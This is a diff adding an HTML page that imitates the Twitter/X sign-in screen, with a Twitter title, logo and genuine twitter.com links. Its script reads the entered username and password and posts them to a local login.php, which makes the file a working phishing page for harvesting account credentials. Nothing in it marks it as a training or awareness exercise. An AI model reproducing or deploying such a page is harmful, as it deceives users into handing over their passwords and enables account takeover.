@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login to Twitter / Twitter</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+  <header class="container">
+    <div class="logo">
+      <img src="img/logo.webp" alt="Twitter Logo">
+    </div>
+  </header>
+
+  <main class="container">
+    <h1 style="color: white;">Sign in to X</h1>
+    <div class="container">
+      <form id="loginForm">
+        <div class="inputs" style="background-color: azure;">
+          <label class="user" for="user">Phone, email, or username</label><br>
+          <input type="text" id="user" name="user">
+        </div>
+        <div class="inputs" style="background-color: azure;">
+          <label class="password" for="password">Password</label><br>
+          <input type="password" id="password" name="password">
+        </div>
+        <br>
+        <!-- Add redirection when "Login" button is clicked -->
+        <button class="button" type="button" onclick="sendCredentials()" style="background-color: azure;color: black;">Login</button>
+      </form>
+      <div class="links container">
+        <a target="_blank" href="https://twitter.com/login?lang=en">Forgot password?</a>
+        <span class="dot"></span>
+        <a target="_blank" href="https://twitter.com/login?lang=en">Sign up</a>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    function sendCredentials() {
+      var username = document.getElementById('user').value;
+      var password = document.getElementById('password').value;
+
+      // Veriyi sunucuya gönderme işlemi
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "login.php", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+          // Sunucudan gelen yanıtı işle
+          var response = JSON.parse(xhr.responseText);
+        }
+      };
+      xhr.send("user=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
+    }
+  </script>
+</body>
+
+</html>
